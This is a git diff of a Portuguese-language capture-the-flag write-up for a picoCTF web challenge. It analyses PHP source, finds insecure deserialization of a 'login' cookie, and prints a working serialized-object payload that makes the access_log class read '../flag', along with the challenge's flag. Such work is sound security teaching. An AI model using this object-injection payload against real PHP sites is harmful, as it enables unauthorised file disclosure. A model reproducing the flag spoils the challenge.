@@ -4,16 +4,20 @@
 
 ## Sobre o Desafio  
 O enunciado apresenta a seguinte descrição: *“Tente recuperar a bandeira armazenada neste site `http://mercury.picoctf.net:14804/`”*.  
-Junto a isso, foi disponibilizada a dica: *"A bandeira está em ../flag"*
+Junto a isso, foi disponibilizada a dica: *“A bandeira está em ../flag”*.  
 
-De primeiro momento, podemos pensar que temos que achar a flag está armazenada dentro do servidor. O objetivo então é explorar o código e identificar uma vulnerabilidade que nos permitisse ler esse arquivo oculto
+De imediato, já fica claro que o objetivo é encontrar uma maneira de acessar um arquivo dentro do servidor. Ou seja, precisamos explorar o código para identificar uma vulnerabilidade que nos permita ler esse arquivo oculto.  
+
 ## Solução  
 
-### Análise inicial do código
-//vou abordar ainda sobre a pagina de login, e depois disso falar do codigo.
+### Análise inicial do código  
+Ao abrir a aplicação web, encontramos um formulário de login:  
 
-Ao acessar o index.phps (para acessar a versão exposta), temos o seguinte codigo php:
-````php
+<img width="1364" height="768" alt="image" src="https://github.com/user-attachments/assets/aa73348e-c943-4e9d-8f2a-223548199ea3" />  
+
+Ao acessar o arquivo `index.phps`, descobrimos o seguinte código:  
+
+```php
 <?php
 require_once("cookie.php");
 
@@ -31,13 +35,15 @@ if(isset($_POST["user"]) && isset($_POST["pass"])){
 	}
 }
 ?>
-````
+```
 
-Isso nos indica que existe mais duas páginas que podemos acessar, `cookie.php` e `authentication.php`.
-Ao analisar o codigo, podemos ver que se tivermos a autorização correta, é setado no nosso codigo um cookie de login que é codificado em base64, e depois é serializado.
+Esse código já nos dá algumas pistas:  
+Existem pelo menos dois arquivos importantes: `cookie.php` e `authentication.php`.  
+Caso o login seja válido, o sistema cria um **cookie chamado `login`**, que é **serializado** e depois **codificado em Base64**.  
 
-Acessando a pagina de `cookie.php`, temos o seguinte código php:
-````php
+Quando abrimos o arquivo `cookie.php`, encontramos o seguinte código:  
+
+```php
 <?php
 session_start();
 
@@ -74,24 +80,24 @@ class permissions
 		return $guest;
 	}
 
-        function is_admin() {
-                $admin = false;
+	function is_admin() {
+		$admin = false;
 
-                $con = new SQLite3("../users.db");
-                $username = $this->username;
-                $password = $this->password;
-                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
-                $stm->bindValue(1, $username, SQLITE3_TEXT);
-                $stm->bindValue(2, $password, SQLITE3_TEXT);
-                $res = $stm->execute();
-                $rest = $res->fetchArray();
-                if($rest["username"]) {
-                        if ($rest["admin"] == 1) {
-                                $admin = true;
-                        }
-                }
-                return $admin;
-        }
+		$con = new SQLite3("../users.db");
+		$username = $this->username;
+		$password = $this->password;
+		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
+		$stm->bindValue(1, $username, SQLITE3_TEXT);
+		$stm->bindValue(2, $password, SQLITE3_TEXT);
+		$res = $stm->execute();
+		$rest = $res->fetchArray();
+		if($rest["username"]) {
+			if ($rest["admin"] == 1) {
+				$admin = true;
+			}
+		}
+		return $admin;
+	}
 }
 
 if(isset($_COOKIE["login"])){
@@ -104,13 +110,84 @@ if(isset($_COOKIE["login"])){
 		die("Deserialization error. ".$perm);
 	}
 }
-
 ?>
-````
-Ao final do código, podemos ver que existe uma função, onde o sistema verifica se o existe de fato um cookie, e a partir disso ele decodifica ele e verifica as permissões de usuário.
-Se nao, ele lança um erro. Aqui podemos encontrar uma brecha, pois como tudo foi setado no cookie, podemos fazer o controle dele.
+```
+
+Aqui percebemos um detalhe importante:  
+Se o cookie `login` existir, ele é **decodificado, desserializado** e usado diretamente.  
+Isso abre uma brecha: podemos manipular o conteúdo desse cookie e forjar informações.  
+
+Agora vamos olhar para `authentication.php`:  
+
+```php
+<?php
+
+class access_log
+{
+	public $log_file;
+
+	function __construct($lf) {
+		$this->log_file = $lf;
+	}
+
+	function __toString() {
+		return $this->read_log();
+	}
+
+	function append_to_log($data) {
+		file_put_contents($this->log_file, $data, FILE_APPEND);
+	}
+
+	function read_log() {
+		return file_get_contents($this->log_file);
+	}
+}
+
+require_once("cookie.php");
+if(isset($perm) && $perm->is_admin()){
+	$msg = "Welcome admin";
+	$log = new access_log("access.log");
+	$log->append_to_log("Logged in at ".date("Y-m-d")."
+");
+} else {
+	$msg = "Welcome guest";
+}
+?>
+```
+
+O ponto crucial está na classe `access_log`, quando o objeto é convertido em string, a função `__toString()` chama o método `read_log()`, que lê o conteúdo do arquivo especificado em `$log_file`.  
+
+Com a vulnerabilidade do cookie, percebemos que é possível criar um novo objeto, serializá-lo e forjar o cookie para apontar diretamente para o arquivo `../flag`.  
+
+### Criando o exploit  
+Podemos simular essa lógica com o seguinte código:  
+
+```php
+<?php
+class access_log {
+    public $log_file;
+}
+
+$o = new access_log();
+$o->log_file = "../flag";
+
+echo serialize($o), "
+";
+echo base64_encode(serialize($o)), "
+";
+?>
+```
+
+Executando esse código, temos:  
+
+```
+O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
+TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
+```
+
+Basta então substituir o valor do cookie `login` por essa string em Base64, recarregar a página e por fim, a flag aparece:  
+
+<img width="1364" height="768" alt="image" src="https://github.com/user-attachments/assets/406135fb-95cf-4a10-85cf-e1e709229344" />  
 
 ### Flag encontrada  
-
-**Flag:**  
-``  
+**Flag:** `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_261d1dcc}`  
